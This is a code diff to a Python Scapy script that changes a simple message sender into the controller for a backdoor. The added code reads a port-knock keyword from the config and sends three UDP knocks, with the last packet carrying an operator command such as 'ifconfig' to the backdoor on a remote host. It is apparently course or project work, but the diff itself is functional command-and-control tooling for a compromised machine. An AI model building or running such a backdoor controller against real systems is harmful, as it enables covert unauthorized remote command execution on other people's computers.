@@ -36,6 +36,7 @@ def read_configuration():
         'receiver_port2': 0,
         'receiver_port3': 0,
         'sender_port': 0,
+        'port_knock_auth': '',
     }
 
     with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
@@ -46,7 +47,7 @@ def read_configuration():
 
             config_data = line.split('=')
             if config_data[0] in configuration:
-                if config_data[0] in ('receiver_address', 'sender_address'):
+                if config_data[0] in ('receiver_address', 'sender_address', 'port_knock_auth'):
                     configuration[config_data[0]] = config_data[1]
                 elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
                     data = config_data[1]
@@ -64,37 +65,61 @@ def read_configuration():
 
 def start_sender():
     print("Starting Sender. (Type \"exit\" to shutdown)")
-    configuration = read_configuration()
-    address = configuration['receiver_address']
-    port = configuration['receiver_port']
+
+    # Generate encryption key if needed. Ensure both sender and receiver have same key.
     encryption.generate_key()
+
+    # Read Configuration
+    config = read_configuration()
+    receiver_addr = config['receiver_address']
+    port1 = config['receiver_port1']
+    port2 = config['receiver_port2']
+    port3 = config['receiver_port3']
+    sender_addr = config['sender_address']
+    sender_port = config['sender_port']
+    port_knock_auth = config['port_knock_auth']
 
     keep_going = True
     while keep_going:
-        user_input = input("Type a message and press enter to send: ")
+        user_input = input("Enter a command to send to backdoor (ie. \"ifconfig\"): ")
         if user_input == "exit":
             print("Sender Shutdown.")
             break
 
         try:
-            encoded_input = user_input.encode("ascii").decode("ascii")
+            encoded_input = user_input.encode("utf-8").decode("utf-8")
         except UnicodeEncodeError or UnicodeDecodeError:
-            print("Invalid character detected. Must be ASCII supported values only.")
+            print("Invalid character detected. Must be UTF-8 supported values only.")
             continue
 
-        send_message(user_input, address, port)
+        send_port_knock_command(user_input, receiver_addr, port1, port2, port3, sender_addr, sender_port,
+                                port_knock_auth)
 
 
-def send_message(message, address, port):
+def send_port_knock_command(message, receiver_addr, port1, port2, port3, sender_addr, sender_port,
+                            port_knock_auth):
 
-    dst = address
-    sport = 7000
-    dport = port
-    inital_seq_num = 1000
+    sport = RandShort()
+    command_payload = port_knock_auth + "|" + message
+
+    # Port-knocking 3 UDP ports with Auth keyword as payload. Include command at end of last packet payload.
+    port_knock_1 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port1) / Raw(load=port_knock_auth)
+    port_knock_2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port2) / Raw(load=port_knock_auth)
+    port_knock_3 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port3) / Raw(load=command_payload)
+    send(port_knock_1, verbose=0)
+    send(port_knock_2, verbose=0)
+    send(port_knock_3, verbose=0)
+
+
+def send_message(message, receiver_addr, port):
+
+    dst = receiver_addr
+    sport = RandShort()
+    dport = 900
 
     # 3-way-handshake
     ip = IP(dst=dst)  # ip = IP(dst=dst, frag=0)
-    tcp_syn = ip / TCP(sport=sport, dport=dport, flags='S', seq=inital_seq_num)
+    tcp_syn = ip/TCP(sport=sport, dport=dport, flags='S')
     tcp_synack = sr1(tcp_syn, verbose=0, timeout=5)
 
     if tcp_synack is None:
@@ -158,6 +183,8 @@ def send_message(message, address, port):
 
 if __name__ == "__main__":
     try:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
         start_sender()
     except KeyboardInterrupt as e:
         print("Sender Shutdown")
